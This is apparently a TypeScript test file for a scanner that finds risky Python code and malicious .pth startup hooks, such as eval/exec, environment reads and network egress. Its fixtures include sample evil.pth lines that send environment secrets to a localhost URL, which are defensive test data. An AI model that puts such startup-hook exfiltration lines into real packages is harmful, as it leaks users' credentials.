import { describe, expect, it } from 'vitest';
import { performance } from 'node:perf_hooks';
import { RiskLevel, maxDeterministicRisk } from '@astram/types';
import { scanPythonCode, scanPythonPth } from './scan-python.js';

const F = 'plugin.py';

describe('scanPythonCode — PY_EXEC (DYNAMIC_EVAL WARN)', () => {
  it('flags exec( and eval(', () => {
    const facts = scanPythonCode('exec("code")\nx = eval("1+1")', F);
    const execs = facts.filter((f) => f.ruleId === 'PY_EXEC');
    expect(execs.map((f) => f.line)).toEqual([1, 2]);
    expect(execs[0]!.category).toBe('DYNAMIC_EVAL');
    expect(execs[0]!.deterministicRisk).toBe(RiskLevel.WARN);
  });

  it('negative: evaluate()/executor() are not eval(', () => {
    const facts = scanPythonCode('result = evaluate(model)\ny = executor.run()', F);
    expect(facts.filter((f) => f.ruleId === 'PY_EXEC')).toHaveLength(0);
  });
});

describe('scanPythonCode — PY_ENV_READ (CRED_ACCESS WARN)', () => {
  it('flags os.environ and os.getenv', () => {
    const facts = scanPythonCode('import os\na = os.environ["TOKEN"]\nb = os.getenv("KEY")', F);
    const env = facts.filter((f) => f.ruleId === 'PY_ENV_READ');
    expect(env.map((f) => f.line)).toEqual([2, 3]);
    expect(env[0]!.category).toBe('CRED_ACCESS');
    expect(env[0]!.deterministicRisk).toBe(RiskLevel.WARN);
  });

  it('negative: no env access', () => {
    const facts = scanPythonCode('print("hello")\nx = 1 + 1', F);
    expect(facts.filter((f) => f.ruleId === 'PY_ENV_READ')).toHaveLength(0);
  });
});

describe('scanPythonCode — PY_NET_EGRESS (NET_EGRESS WARN)', () => {
  it('flags urllib.request, requests., socket., httpx', () => {
    const facts = scanPythonCode(
      [
        'import urllib.request',
        'urllib.request.urlopen(u)',
        'import requests',
        'r = requests.get(u)',
        'import socket',
        's = socket.create_connection(h)',
        'import httpx',
      ].join('\n'),
      F
    );
    const net = facts.filter((f) => f.ruleId === 'PY_NET_EGRESS');
    expect(net.map((f) => f.line)).toEqual([1, 2, 4, 6, 7]);
    expect(net[0]!.category).toBe('NET_EGRESS');
    expect(net[0]!.deterministicRisk).toBe(RiskLevel.WARN);
  });

  it('negative: no network usage', () => {
    const facts = scanPythonCode('value = my_requests.get_local(x)\nprint("socketless")', F);
    expect(facts.filter((f) => f.ruleId === 'PY_NET_EGRESS')).toHaveLength(0);
  });
});

describe('scanPythonPth', () => {
  it('benign .pth (comments, blanks, plain single imports, and directory paths) yields no facts', () => {
    const benign = [
      '# installed by pip',
      '',
      'import os',
      '   ',
      '# directory paths to add to sys.path',
      'src',
      'packages/my_lib',
      'C:\\Python311\\Lib\\site-packages',
      '/usr/local/lib/python3.11/dist-packages',
      '# another comment',
    ].join('\n');
    expect(scanPythonPth(benign, 'x.pth')).toEqual([]);
  });

  it('exempts known safe system .pth files like distutils-precedence.pth', () => {
    const content = 'import os\nif os.environ.get("SETUPTOOLS_USE_DISTUTILS") != "stdlib":\n    import distutils';
    expect(scanPythonPth(content, 'distutils-precedence.pth')).toEqual([]);
  });

  it('PY_PTH_CODE (STARTUP_HOOK HOLD): multi-module import and any code line', () => {
    const facts = scanPythonPth('import os, urllib.request\nprint("runs at startup")', 'evil.pth');
    const code = facts.filter((f) => f.ruleId === 'PY_PTH_CODE');
    expect(code.map((f) => f.line)).toEqual([1, 2]);
    for (const f of code) {
      expect(f.category).toBe('STARTUP_HOOK');
      expect(f.deterministicRisk).toBe(RiskLevel.HOLD);
    }
  });

  it('PTH_EXFIL_CHAIN (STARTUP_HOOK HOLD) when env read + network egress combine', () => {
    const facts = scanPythonPth(
      'import os, urllib.request\nurllib.request.urlopen("http://127.0.0.1:1/s=" + os.environ.get("K", ""))',
      'evil.pth'
    );
    const chain = facts.find((f) => f.ruleId === 'PTH_EXFIL_CHAIN');
    expect(chain).toBeDefined();
    expect(chain!.category).toBe('STARTUP_HOOK');
    expect(chain!.deterministicRisk).toBe(RiskLevel.HOLD);
    expect(chain!.line).toBe(2);
    // Python capability facts are surfaced too (needed for TEST-01 categories).
    expect(facts.some((f) => f.ruleId === 'PY_ENV_READ' && f.category === 'CRED_ACCESS')).toBe(true);
    expect(facts.some((f) => f.ruleId === 'PY_NET_EGRESS' && f.category === 'NET_EGRESS')).toBe(true);
    expect(maxDeterministicRisk(facts)).toBe(RiskLevel.HOLD);
  });

  it('negative: env read alone (no egress) is not an exfil chain', () => {
    const facts = scanPythonPth('import os\nprint(os.environ.get("HOME"))', 'x.pth');
    expect(facts.some((f) => f.ruleId === 'PTH_EXFIL_CHAIN')).toBe(false);
  });

  it('TEST-01 timing budget: 200-line .pth scans in < 50 ms (warm)', () => {
    const lines: string[] = ['# mock package .pth (static data only)', 'import os'];
    for (let i = 0; i < 96; i++) {
      lines.push(`# filler comment ${i}`);
      lines.push(`import filler${i}`);
    }
    lines.push('import os, urllib.request');
    lines.push(
      'urllib.request.urlopen("http://127.0.0.1:19999/exfil?s=" + os.environ.get("AEGIS_CANARY_SECRET_999", ""))'
    );
    while (lines.length < 200) lines.push('# tail filler');
    const content = lines.slice(0, 200).join('\n');
    expect(content.split('\n')).toHaveLength(200);

    scanPythonPth(content, 'timing.pth'); // warm-up
    const t0 = performance.now();
    const facts = scanPythonPth(content, 'timing.pth');
    const elapsed = performance.now() - t0;
    expect(maxDeterministicRisk(facts)).toBe(RiskLevel.HOLD);
    expect(elapsed).toBeLessThan(50);
  });
});
